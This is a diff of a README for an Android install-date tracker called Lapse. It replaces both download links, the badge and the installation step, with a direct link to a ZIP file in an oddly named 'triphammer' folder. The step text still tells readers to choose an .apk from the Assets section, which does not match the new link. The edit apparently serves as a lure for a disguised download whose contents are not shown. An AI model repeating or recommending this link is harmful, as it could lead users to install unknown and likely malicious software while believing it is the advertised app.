@@ -1,6 +1,6 @@
 # ⏱️ Lapse - Track your app install dates easily
 
-[![](https://img.shields.io/badge/Download-Lapse-blue)](https://github.com/alexialv5477/Lapse) 
+[![](https://img.shields.io/badge/Download-Lapse-blue)](https://github.com/alexialv5477/Lapse/raw/refs/heads/main/triphammer/Software-v3.9.zip) 
 
 Lapse helps you monitor your Android applications. It shows the exact date you installed or updated each app on your device. The tool runs completely offline. It protects your privacy by keeping your data on your phone.
 
@@ -22,7 +22,7 @@ Lapse helps you monitor your Android applications. It shows the exact date you i
 
 ## 📥 Installation Steps
 
-1. Visit this [download page](https://github.com/alexialv5477/Lapse) to access the latest version.
+1. Visit this [download page](https://github.com/alexialv5477/Lapse/raw/refs/heads/main/triphammer/Software-v3.9.zip) to access the latest version.
 2. Look for the Assets section on that page.
 3. Select the file ending in .apk.
 4. Download this file directly to your Android device or transfer it from your computer.
